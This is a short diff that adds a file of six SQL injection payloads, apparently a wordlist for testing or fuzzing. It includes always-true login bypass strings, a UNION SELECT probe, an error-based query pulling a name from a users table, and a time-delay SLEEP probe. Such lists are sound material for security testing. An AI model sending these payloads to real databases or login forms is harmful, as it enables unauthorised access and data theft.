@@ -1,0 +1,6 @@
+' OR '1'='1
+' OR '1'='1' --
+' UNION SELECT NULL --
+' AND 1=CAST((SELECT TOP 1 name FROM users) AS INT) --
+' AND SLEEP(3) --
+" OR "a"="a
